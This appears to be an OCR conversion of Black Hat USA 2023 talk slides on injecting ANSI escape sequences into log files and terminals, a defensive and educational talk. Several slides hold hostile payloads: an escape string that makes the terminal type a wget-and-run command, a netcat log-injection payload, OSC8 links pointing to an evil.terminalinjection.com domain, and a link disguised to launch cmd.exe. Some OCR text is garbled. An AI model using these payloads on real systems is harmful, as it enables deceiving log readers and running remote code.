---
title: "Weaponizing Plain Text ANSI Escape Sequences as a Forensic Nightmare"
speakers: ["STOK"]
conference: "Black Hat"
conference_full: "Black Hat USA 2023"
edition: "USA"
year: 2023
source_pdf: "Black Hat USA 2023 slides/STOK_Weaponizing Plain Text ANSI Escape Sequences as a Forensic Nightmare.pdf"
pages: 150
sha256: "0c35b624a2636f8f76b5f36b50cfa9974f7753bd6cb834aaa815ed678bc90fc7"
text_chars: 54575
ocr_pages: 48
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.1
ocr_unreliable_blocks: 0
vision_verified_blocks: 1
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:25:09Z"
---
# Weaponizing Plain Text ANSI Escape Sequences as a Forensic Nightmare

**Speakers:** STOK  
**Conference:** Black Hat USA 2023  
**Source:** `Black Hat USA 2023 slides/STOK_Weaponizing Plain Text ANSI Escape Sequences as a Forensic Nightmare.pdf` (150 pages)


## Slide 1

**STÖK**

## Slide 2

**WELCOME** `Weaponizing Plain Text: ANSI Escape Sequences as a Forensic Nightmare.` **THIS IS THE STRIPPED DOWN RESOURCE APPENDIX OF THE FULL TALK**

## Slide 3

###### **LOGS ARE A VITAL COMPONENT FOR: MAINTAINING APPLICATION RELIABILITY, PERFORMANCE, AND SECURITY. + LOGS DONT LIE, PEOPLE DO..**

## Slide 4

**DO YOU TRUST EM?**

## Slide 5

**WHAT HAPPENS IF YOU DON’T?**

## Slide 6

**POC OF A CREATIVE RANSOMWARE AD INSIDE A LOGFILE**


> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
stok@STOKs-MBP:~/Documents/logs yy
172.17.0.1 - - [10/Jul/2023:08:40:38 +0000] "GET /tutorial/using-bind-mounts/updated-add-button.png HTTP/1.
©0 21838
“http: //127.0.0.1/tutorial/using-bind-mounts/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537. 3:
HTML, like
Gecko) Chrome/114.0.5735.199 Safari/537.36" "
RESTORE 2
Your Data is safe with us! 24H FAST RESTORE SERVICE ®!
Need some help you do the math?, Here's a calculator ‘
POC OF A CREATIVE RANSOMWARE AD INSIDE ALOGFILE
» logs cat everything. logo0$rm;open a calculator; shit
cat: everything.logO0: No such file or directory .
```

## Slide 7

###### **iTERM2 DOCKER VSCODE KITTY TERMINAL.APP WINDOWS TERMINAL GNOME VTE XTERM**


> Recovered by OCR — confidence 75/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
sameness eee Last Login: Tue Jul 11 09:13:03 on ttys01é
TERMINAL zsh + D Leaming Cente
Recommendec Extension
eee ~/Documents/terminal
+ terminal
VS C O D E @ stok — stok@STOKs-MacBook-Pro
KITTY
C:\Windows\System32>
Command Prompt Ctri+Shift+2
Me AureCloud Shell ——_crtastunss T E R M | N Al AP Pp
%8 Settings Ctrl+, e
Command Palette Curl+sie-?
WINDOWS
TERMINAL GNOME VTE
```

## Slide 8

##### **CLOUD CLI**

**https://github.com/chjj/term.js https://github.com/xtermjs/xterm.js**


> Recovered by OCR — confidence 88/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CLOUD CLI
Droplet Console
Ise sole for native-like terminal access to your Droalet from you
5 for the new consol
o aS Launch Droplet Console
Recovery Console
you can't connec et with the Dropict
ord authentication. if nec y, You can reset you
Launch Recovery Console
4.2)
https://github.com/chjj/term.js
https://github.com/xtermjs/xterm.js
```

## Slide 9

##### **XTERM**

**https://invisible-island.net/xterm/ctlseqs/ctlseqs.html**


> Recovered by OCR — confidence 90/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
8 invisible-island.net Bw
Send Device Attributes (Secondary DA).
Ps = @® or omitted = request the terminal's identification
code. The response depends on the decTerminalID resource
setting. It should apply only to VT220 and up, but xterm
extends this to VT1@@.
= CSI > Pp; Pv; Pee
where Pp denotes the terminal type
= "VT100".
= "VT240" or "VT241".
and Pv is the firmware version (for xterm, this was originally
the XFree86 patch number, starting with 95). Ina DEC
terminal, Pc indicates the ROM cartridge registration number
and is always zero.
CSI Psd Line Position Absolute [row] (default = [1,column]) (VPA).
CSI Ps e Line Position Relative [rows] (default = [rowt+1,column])
CVPR).
Horizontal and Vertical Position [row;column] (default
[1,1]) CHVP).
Tab Clear (TBC). ECMA-48 defines additional codes, but the
VT100 user manual notes that it ignores other codes. DEC's
Later terminals (and xterm) do the same, for compatibility.
Ps =®8 = Clear Current Column (default).
Ps=3 = Clear All.
Set Mode (SM).
```

## Slide 10

**BASICS**

## Slide 11

**XTERM**

\```
CSI Pm m Character Attribute
Ps = 3 2 -> Set foreground color to Green.
Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007'
\```

**https://invisible-island.net/xterm/ctlseqs/ctlseqs.html**

## Slide 12

##### **XTERM**

\```
CSI Pm m Character Attribute
Ps = 3 2 -> Set foreground color to Green.
Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007'
\```

**https://invisible-island.net/xterm/ctlseqs/ctlseqs.html**

## Slide 13

##### **XTERM**

\```
CSI Pm m Character Attribute
Ps = 3 2 -> Set foreground color to Green.
Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007'
Hello THIS IS GREEN
\```

**https://invisible-island.net/xterm/ctlseqs/ctlseqs.html**

## Slide 14

**ESCAPE CHAR** `CSI Pm m Character Attribute Ps = 3 2 -> Set foreground color to Green. Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' Hello THIS IS GREEN` **ESC CHARACTER**

## Slide 15

**TOMATO - TOMATO** `Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' - OCTAL Printf 'Hello \x1b[32mTHIS IS GREEN\x1b[0m\x07' - HEX Printf 'Hello \u001b[32mTHIS IS GREEN\u001b[0m\u0007' - UNICODE Printf 'Hello \27[32mTHIS IS GREEN\27[0m\7' - DECIMAL Printf 'Hello \e[32mTHIS IS GREEN\e[0m\a' - ASCII`

## Slide 16

##### **BASH = OCTAL PYTHON = HEX JAVA / JS = UNICODE POWERSHELL= DECIMAL**

## Slide 17

**ESCAPE CHAR** `CSI Pm m Character Attribute Ps = 3 2 -> Set foreground color to Green. Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' Hello THIS IS GREEN` **ESC CHARACTER**

## Slide 18

**CONTROL SEQUENCE INTRODUCER** `CSI Pm m Character Attribute Ps = 3 2 -> Set foreground color to Green. Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' Hello THIS IS GREEN`

###### **CSI CHARACTER**

## Slide 19

**NUMBER = COLOR** `CSI Pm m Character Attribute Ps = 3 2 -> Set foreground color to Green. Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' Hello THIS IS GREEN` **PARAMETER 32=GREEN**

## Slide 20

###### **STRING OUTPUT**

`CSI Pm m Character Attribute Ps = 3 2 -> Set foreground color to Green. Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' Hello THIS IS GREEN` **STRING**

## Slide 21

**ESCAPE CHAR** `CSI Pm m Character Attribute Ps = 3 2 -> Set foreground color to Green. Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' Hello THIS IS GREEN`

###### **ESC CHARACTER**

## Slide 22

**CONTROL SEQUENCE INTRODUCER** `CSI Pm m Character Attribute Ps = 3 2 -> Set foreground color to Green. Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' Hello THIS IS GREEN`

###### **CSI CHARACTER**

## Slide 23

**NUMBER = COLOR** `CSI Pm m Character Attribute Ps = 3 2 -> Set foreground color to Green. Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' Hello THIS IS GREEN`

**PARAMETER 0=RESET**

## Slide 24

**STRING OUTPUT** `CSI Pm m Character Attribute Ps = 3 2 -> Set foreground color to Green. Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' Hello THIS IS GREEN THIS IS ALSO GREEN HULK SMAAAAAASH` **STRING**

## Slide 25

**STRING TERMINATOR (ST) OR A "BELL" CHAR** `CSI Pm m Character Attribute Ps = 3 2 -> Set foreground color to Green. Printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' Hello THIS IS GREEN`

###### **DING!**

## Slide 26

**STORED EXAMPLE** `printf '\033[31mESC-INJECTION:\033[32mSUCCESSFUL\033[0m\033' > badlog.log`

## Slide 27

##### **VIM**

\```
vim badlog.log
~
~^[[31mESC-INJECTION:^[[32mSUCCESSFUL^[[0m^[
~
\```

## Slide 28

##### **VIM**

\```
vim badlog.log
\```

\```
~
~^[[31mESC-INJECTION:^[[32mSUCCESSFUL^[[0m^[
~
\```

## Slide 29

##### **NANO**

vim badlog.log
~
~^[[31mESC-INJECTION:^[[32mSUCCESSFUL^[[0m^[
~


> Recovered by OCR — confidence 76/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
nano badlog.log
Uw PICO 5.09 File: badlog. log
we Get Help @f@ WriteOut MIN Read Filegaf Prev Pg (IN Cut Text f@ Cur Pos
wd Exit we) Justify i) Where is MAY Next Pg (J UnCut Text To Spell
```

## Slide 30

**\U001B**


> Recovered by OCR — confidence 89/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
<html>
<head>
</head>
<body>
<hl>This site Xontains non malicious ANSI Escape sequences</hi>
</body>
</html> \UOOT B
1
2
3
4
6
7
8
9
1
```

## Slide 31

##### **CAT**

\```
> cat *.log
ESC-INJECTION:SUCCESSFUL
>
\```

## Slide 32

##### **GREP**

\```
> grep INJEC -r ./
.//badlog.log:ESC-INJECTION:SUCCESSFUL
>
\```

## Slide 33

##### **TAIL**

\```
> tail badlog.log
ESC-INJECTION:SUCCESSFUL
>
\```

## Slide 34

##### **AWK**

\```
> awk '{print $1}' badlog.log
ESC-INJECTION:SUCCESSFUL
>
\```

## Slide 35


> Recovered by OCR — confidence 91/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
eee stok@STOKs-MacBook-Pro:~/Documents/terminal
```

## Slide 36


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
eee stok@STOKs-MacBook-Pro:~/Documents/terminal
> terminal curl https://terminalinjection.com
<html>
<head>
<title>ESC-INJECTION: SUCCESSFUL</title>
</head>
<body>
<hl>This site contains non malicious ANSI Escape sequences</hl>
</body>
</html>
> terminal |
```

## Slide 37

**NSLOOKUP - SANITIZED ON OSX**


> Recovered by OCR — confidence 83/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
0@e@ nslookup
> terminal nslookup
> set g=TXT
Server: 198.18.11.221
Non-authoritative answer:
evil.terminalinjection.com text = "\027[32mESC-INJECTION-RAW: \027[31mSUCCESSFUL\027[Om\007"
Authoritative answers can be found from:
>|
```

## Slide 38

> **NOT ON WINDOWS. BIGUPS TO DAVID!**


> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BY Windows PowerShell
PS C:\Users\stok> nslookup
Default Server: prl-Local-ns-server. shared
Address: 10.211.55.1
> set gq=TXT
> evil.terminalinjection.com
Server: prl-Local-ns-server.shared
Address: 10.211.55.1
Non-authoritative answer:
evil.terminalinjection.com text =
"ESC-INJECTION-RAW: SUCCESSFUL"
evil.terminalinjection.com text =
> |
```

## Slide 39

##### **IS THIS EVEN A SECURITY ISSUE?**

## Slide 40

##### **WHERE? WHO ? HOW ? WOULD THIS BE AN ISSUE?**

## Slide 41

**WHAT? CONSEQUENCES**

## Slide 42

**WHERE? LOG INJECTION!**

\```
Printf ‘Hello \033[31mTHIS IS GREEN\033[0m\007'
Hello THIS IS GREEN
\```

\```
Printf ‘Hello \033[32mTHIS IS GREEN\033[0m\007’
Hello THIS IS GREEN
\```

## Slide 43

**WHO? DEVOPS SYSADMINS IR / FORENSIC**

## Slide 44

## **WHO? INTERACT WITH LOGFILES USING A TERMINAL**

## Slide 45

**HOW? LOG INJECTION?**

**https://owasp.org/www-community/attacks/Log_Injection**


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HOW?
Log injection vulnerabilities occur when:
1. Data enters an application from an untrusted source.
2. The data is written to an application or system log file.
https://owasp.org/www-community/attacks/Log_Injection
```

## Slide 46

**HOW? LOG INJECTION?**

**https://owasp.org/www-community/attacks/Log_Injection**


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
HOW?
Successful log injection attacks can cause:
1. Injection of new/bogus log events (log forging via log injection)
2. Injection i Escape seq [aes that the malicious log event isviewed in a Terminal Emulator
3. Injection of commands that REA ieame COUIC execute
https://owasp.org/www-community/attacks/Log_Injection
```

## Slide 47

**https://www.docker.com/blog/getting-started-with-docker-desktop/**


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 82/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Docker Desktop window]
Docker Desktop   Update to latest        Search for local and remote images, containers, and more...  ⌘K            Sign in
Containers
Images
Volumes
Dev Environments BETA
Learning Center
Extensions
Resource usage
Add Extensions

affectionate_chandrasekhar
< [icon] docker/getting-started
2e0348d7fed4 [copy icon]
80:80 [link icon]                                                    STATUS: Running (0 seconds ago)  [stop] [play] [restart] [delete]
Logs   Inspect   Terminal   Files   Stats

172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /assets/stylesheets/application.adb8469c.css HTTP/1.1" 200 76332 "http://127.0.0.1/" "Mozilla/5.0 (Windows N[obscured by hover icons]leWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /assets/stylesheets/application-palette.a8b3c06d.css HTTP/1.1" 200 38773 "http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /tutorial/ HTTP/1.1" 200 14807 "http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /assets/fonts/font-awesome.css HTTP/1.1" 200 30721 "http://127.0.0.1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /images/docker-labs-logo.svg HTTP/1.1" 200 6469 "http://127.0.0.1/tutorial/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /tutorial/tutorial-in-dashboard.png HTTP/1.1" 200 109860 "http://127.0.0.1/tutorial/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /assets/javascripts/application.c33a9706.js HTTP/1.1" 200 79589 "http://127.0.0.1/tutorial/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /assets/fonts/specimen/MaterialIcons-Regular.woff2 HTTP/1.1" 200 44300 "http://127.0.0.1/assets/fonts/material-icons.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /assets/fonts/specimen/FontAwesome.woff2 HTTP/1.1" 200 77160 "http://127.0.0.1/assets/fonts/font-awesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"
172.17.0.1 - - [10/Jul/2023:08:30:56 +0000] "GET /fonts/hinted-Geomanist-Book.ttf HTTP/1.1" 200 73568 "http://127.0.0.1/css/styles.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" "-"

RAM 5.53 GB   CPU 1.80%   Disk 47.27 GB avail. of 58.37 GB   Not connected to Hub                              v4.19.0

[Browser window]
Getting Started - Getting Starte  x   +
127.0.0.1/tutorial/                                                          [flask icon] [square icon] Guest
docker Labs   Getting Started                          Search                              docker/getting-started

Getting Started                    Getting Started                          Table of contents
Getting Started                                                              The command you just ran
Our Application                                                              The Docker Dashboard
Updating our App                    The command you just ran                 What is a container?
Sharing our App                                                              What is a container image?
Persisting our DB                   Congratulations! You have started the container for this tutorial! Let's first explain the command
Using Bind Mounts                   that you just ran. In case you forgot, here's the command:
Multi-Container Apps
Using Docker Compose                docker run -d -p 80:80 docker/getting-started

https://www.docker.com/blog/getting-started-with-docker-desktop/
```

## Slide 48

**DOCKER LOGS** `docker attach <containerid> docker logs --follow <containerid>`

\```
Failed (2: No such file or directory), client: 172.17.0.1, server:
localhost, request: "GET /tutorial/blah HTTP/1.1", host: "127.0.0.1"
2023/07/13 10:50:56 [error] 21#21: *28 open() "/usr/share/nginx/html/
tutorial/blah
\```

## Slide 49

\```
printf '\033[31mESC-INJECTION:\033[32mSUCCESSFUL\033[0m\033'
\```

## Slide 50

##### **URL ENCODE**

\```
printf '\033[31mESC-INJECTION:\033[32mSUCCESSFUL\033[0m\033'
\n
\```

\```
/%0a%1B%5B31mESC-INJECTION-LFURLENCODED:%1B%5B32mSUCCESSFUL%1B%5B0m%07%0a
\```

## Slide 51

**URL ENCODE**

\```
Printf '\033[31mTHIS IS RED:\033[32mTHIS IS GREEN\033[0m\007'
THIS IS RED:THIS IS GREEN
/%0a%1B%5B31mESC-INJECTION-LFURLENCODED:%1B%5B32mSUCCESSFUL%1B%5B0m%07%0a
\```

## Slide 52

**HOW? URL ENCODE** `Printf '\033[31mTHIS IS RED:\033[32mTHIS IS GREEN\033[0m\007' THIS IS RED:THIS IS GREEN /%0a%1B%5B31mESC-INJECTION-LFURLENCODED:%1B%5B32mSUCCESSFUL%1B%5B0m%07%0a`

**ENOUGH FOR A POC**

## Slide 53

###### **2003 - H D MOORE**

**https://marc.info/?l=bugtraq&m=104612710031920&q=p3**


> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
{ Test Emulator Versions ]
xterm: xf86 4.2.0 (patch 165)
aterm: 0.42
rxvt:
Eterm:
konsole:
putty:
SecureCRT:
gnome-terminal:
hanterm-xf:
3
8
1
@ rc5
6
2
(libzvt 2.0.1) [2.2 indirectly]
[ Vulnerability Index ]
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned CVE
candidate namess for all issues described in this paper.
CAN-2003-0820 Apache Error Log Escape Sequence Injection
CAN-2003-0021 Screen Dump: Eterm
CAN-2003-0822 Screen Dump: rxvt
CAN-2003-0063 Window Title Reporting: xterm
CAN-2003-@064 Window Title Reporting: dtterm
CAN-2003-0065 Window Title Reporting: uxterm
CAN-2003-0066 Window Title Reporting: rxvt
CAN-2003-@067 Window Title Reporting: aterm
CAN-2003-0068 Window Title Reporting: eterm
CAN-2003-0869 Window Title Reporting: putty
CAN-2003-0070 Window Title Reporting: gnome-terminal
CAN-2003-0078 Window Title Reporting: hanterm-xf
CAN-2003-0071 DEC UDK Processing DoS: xterm
CAN-2003-0079 DEC UDK Processing DoS: hanterm-xf
CAN-2003-@023 Menubar Manipulation: rxvt
CAN-2003-0024 Menubar Manipulation: aterm
https
```

## Slide 54

###### **2003 - H D MOORE**

\```
OSC Ps ; Pt ST
Ps = 2  ⇒  Change Window Title to Pt.
\```

**https://marc.info/?l=bugtraq&m=104612710031920&q=p3**

## Slide 55

###### **2003 - H D MOORE**

**https://marc.info/?l=bugtraq&m=104612710031920&q=p3**

## Slide 56

###### **2003 - H D MOORE**

**https://marc.info/?l=bugtraq&m=104612710031920&q=p3**


> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BY owned?
PS C:\Users\stok> write-host "$([char]0x1b) $C[cha
PS C:\Users\stok>
2003 - H D MOORE
Sun
https://marc.info/?l=bugtraq&m=104612710031920&q=p3
Description
de-iconify
iconify
move window to pixel-position
resize window in pixels
raise window to front of stack
raise window to back of stack
refresh window
resize window in chars
maximize/unmaximize window
to/from full-screen
report if window is iconified
report window position
report window size in pixels
report screen size in pixels
report character cell in pixels
report window size in chars
report screen size in chars
report icon Label
report window title
save window/icon title
restore window/icon title
resize window (DECSLPP)
set window and icon title
set icon Label
set window title
set X server property
set icon to file
set window title
icon Label
```

## Slide 57

###### **2003 - H D MOORE**

\```
CSI Ps t
Ps = 21  ⇒ Report Windows Title
\```

**https://marc.info/?l=bugtraq&m=104612710031920&q=p3**


> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Code Sun CDE XTerm Description
csI it yes | yes yes de-iconify
csI 2t yes | yes yes iconify
cSsI3t yes | yes yes move window to pixel-position
cSsI 4 t yes | yes yes resize window in pixels
PS C:\Users\stok> : CSI 5t yes | yes yes raise window to front of stack
csi 6t yes | yes yes raise window to back of stack
. csI 7 t yes | yes yes refresh window
PS C:\Users\stok> csI 8 t yes | yes yes resize window in chars
CsI 9 t - - yes maximize/unmaximize window
C5I1¢@t - - yes to/from full-screen
csI iit yes | yes yes report if window is iconified
csIi2t = = = =
cSIi3t yes | yes yes report window position
cSsIi4t yes | yes yes report window size in pixels
cst 1i15t - - yes report screen size in pixels
CST 16t - - yes report character cell in pixels
csI17t - - - -
csI18t yes | yes yes report window size in chars
csiligt = = yes report screen size in chars
CSI. 2@t | - | yes | yes | report icon Label
CSI 21t | - | yes | yes | report window title
CSI 22t - - yes Save window/icon title
CSI 23t - - yes restore window/icon title
CSI Ps t CSI 24t - - yes resize window (DECSLPP)
; ; OSC 0 ST - yes yes set window and icon title
Ps = 21 = Report Windows Title OSC 1 ST - yes yes set icon Label
OSC 2 ST - yes yes set window title
OSC 3 ST = n/a yes set X server property
osc I ST yes yes yes set icon to file
OSC Ll ST yes yes yes set window title
osc L ST yes | yes yes set icon Label
```

## Slide 58

###### **2003 - H D MOORE**

\```
\033]2;;wget 127.0.0.1/.bd;sh .bd;exit;\007\033[21t\033]2;xterm\007Press Enter>\033[8m;
\```

\```
CSI Ps t
Ps = 21  ⇒ Report Windows Title
\```

**https://marc.info/?l=bugtraq&m=104612710031920&q=p3**

## Slide 59

###### **2003 - H D MOORE**

**FIXED!** `\033]2;;wget 127.0.0.1/.bd;sh .bd;exit;\007\033[21t\033]2;xterm\007Press Enter>\033[8m; CSI` _`Ps`_ `t` _`Ps`_ `= 21  ⇒ Report Windows Title` **https://marc.info/?l=bugtraq&m=104612710031920&q=p3**

## Slide 60

###### **GIOVANNI "EVILALIV3" PELLERANO ALESSANDRO "JEKIL" TANASI FRANCESCO "ASCII" ONGARO**

###### **2010**

\```
echo -en "GET /\x1b]2;\x07\x0a\x0d\x0a\x0d" > payload
nc localhost 80 < payload
\```

**NGINX, VARNISH, CHEROKEE, THTTPD, MINI-HTTPD, WEBRICK, ORION, AOLSERVER,YAWS AND BOA LOG ESCAPE SEQUENCE INJECTION - 2010-01-10**

**https://www.ush.it/team/ush/hack_httpd_escape/adv.txt**

## Slide 61

###### **2010**

###### **GIOVANNI "EVILALIV3" PELLERANO ALESSANDRO "JEKIL" TANASI FRANCESCO "ASCII" ONGARO** `echo -en "GET /\x1b]2;\x07\x0a\x0d\x0a\x0d" > payload nc localhost 80 < payload` **FIXED! NGINX, VARNISH, CHEROKEE, THTTPD, MINI-HTTPD, WEBRICK, ORION, AOLSERVER,YAWS AND BOA LOG ESCAPE SEQUENCE INJECTION - 2010-01-10**

**https://www.ush.it/team/ush/hack_httpd_escape/adv.txt**

## Slide 62

###### **2022 - Eviatar Gerzi**

**https://www.cyberark.com/resources/threat-research-blog/dont-trust-this-title-abusingterminal-emulators-with-ansi-escape-characters**

## Slide 63

###### **2022 - Eviatar Gerzi**

FIXED!

**https://www.cyberark.com/resources/threat-research-blog/dont-trust-this-title-abusingterminal-emulators-with-ansi-escape-characters**

## Slide 64

# **PROPRIETARY ESCAPE CODES**


> Recovered by OCR — confidence 79/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
PowerShell
a Bell
Session -tcsh #2 just rang a bell!
| ESC ]9;7; "cmd“ ST {Run some process with arguments.
PRO TARY
ESC ODES
Archive: dum rip
99°21 [/tmn) Using iTerm2 v3's password manager. Cool]
```

## Slide 65

**ADAPTED TRUSTED NICE?**

## Slide 66

**WEPONIZE!**

## Slide 67

**OSC8 LINK ALL THE THINGS!** `An error has occured. Visit https://learn.microsoft.com/KB123YOLO To learn more`

## Slide 68

**OSC8 LINK ALL THE THINGS!** `printf '\033]8;;http://example.com\033\\This is a link\033]8;;\033\\'` <u>`This is a link`</u>

**https://github.com/Alhadis/OSC8-Adoption**

## Slide 69

**OSC8 LINK ALL THE THINGS!** `write-output "An error has occured. Visit $([char]0x1b)]8;;file://c: \Windows\System32\cmd.exe$([char]0x1b)\https://learn.microsoft.com/ KB123YOLO$([char]0x1b)]8;;$([char]0x1b)\ To learn more" An error has occured. Visit https://learn.microsoft.com/KB123YOLO To learn more`

###### **NEW ADDITION OF FILE:URI = POTENTIAL FOR FUNSTUFF**

## Slide 70

**OSC8**

\```
printf '\033]8;;http://example.com\033\\This is a link\033]8;;\033\\'
This is a link
\```

\```
Printf  '\033]8;;http://evil.terminalinjection.com\007'
\```

## Slide 71

**OSC8 LINK ALL THE THINGS!** `printf '\033]8;;http://example.com\033\\This is a link\033]8;;\033\\'` <u>`This is a link`</u>

## Slide 72

### **OSC8 LINK ALL THE THINGS!**

\```
printf  '\033]8;;http://evil.terminalinjection.com\007'
➜  logs ls -la
total 912
drwxr-xr-x@   3 stok  staff      96 Jul 10 12:40 .
drwx------@ 169 stok  staff    5408 Jul 10 12:40 ..
-rw-r--r--@   1 stok  staff  405305 Jul 10 13:32 everything.log
\```

## Slide 73

**OSC8**

\```
printf '\033]8;;http://example.com\033\\This is a link\033]8;;\033\\'
This is a link
\```

\```
Printf  '\033]8;;http://evil.terminalinjection.com\007'
\```

###### **SOME TERMINALS GENERATE WARNINGS, OTHERS DONT.**

## Slide 74

**OSC8 LINK ALL THE THINGS!** `curl 127.0.0.1/hello%1b%5d8%3b%3bhttp%3a%2f%2fevil.terminalinjection.com%07`

## Slide 75

##### **OSC8**

\```
curl 127.0.0.1/hello%1b%5d8%3b%3bhttp%3a%2f%2fevil.terminalinjection.com%07
\```


> Recovered by OCR — confidence 93/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ 404 Not Found x +
Do you want to navigate to http:/
evil.terminalinjection.com?
WARNING: This link could
potentially be dangerous
Cancel OK
404 Not Found
```

## Slide 76


> Recovered by OCR — confidence 78/100 on the text kept, 63/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
> Volumes Logs Inspect Files Stats
om https://evil.terminalinjection.com https://evil.terminalinjection.com https://evil.terminalinjection.com https://evil.terminalinjection.com https://evil.termineg Q O a it
e
Extensions
" Resource u
@ Add Extensic
0 & htt, terminalinjection.com
this is fine, trust me.
```

## Slide 77

**INLINE IMAGE SUPPORT**

## Slide 78

**https://code.visualstudio.com/updates/v1_80**


> Recovered by OCR — confidence 94/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Visual Studio Code Docs Updates Blog API Extensions FAQ Learn Pp + Downloac
UPDATES Te rminal IN THIS UPDATE
June 2023 Accessibility
May 2023 Image support
Images in the terminal, which were previewed last release, are now enabled by default. Images in a
Workbench
Editor
terminal typically work by encoding the image pixel data as text, which is written to the terminal via a
March 2023 Testing
special escape sequence. The current protocols supported are sixel and the inline images protocol
Source Control
February 2023 pioneered by iTerm.
Notebooks
January 2023 To test images manually, you can download and cat a .six example file from the libsixel repository:
Languages
November 2022 10 TERMINAL Remote Development
October 2022 Contr ons to extensions
» cat snake.six Preview Features
September 2022
Extension authoring
August 2022 Proposed APIs
Engineerin
July 2022 $ 9
Dacumentation
June 2022 Notable fixes
April 2022 Subscribe
Ask questions
March 2022
Fallow @code
February 2022 Request features
January 2022 Report issues
Watch videos
November 2021
October 2021
September 2021
https://code.visualstudio.com/updates/v1_80
```

## Slide 79

**MAKES YOU WONDER WHAT THAT LOGFILE CONTAINS?**


> Recovered by OCR — confidence 91/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Visual Studio Code laa!
badlog. log goatse. log
MAKES YOU WONDER WHAT THAT LOGFILE CONTAINS?
```

## Slide 80

**CLIPBOARD INJECTION OSC52**


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
<> Code
) Issues
29
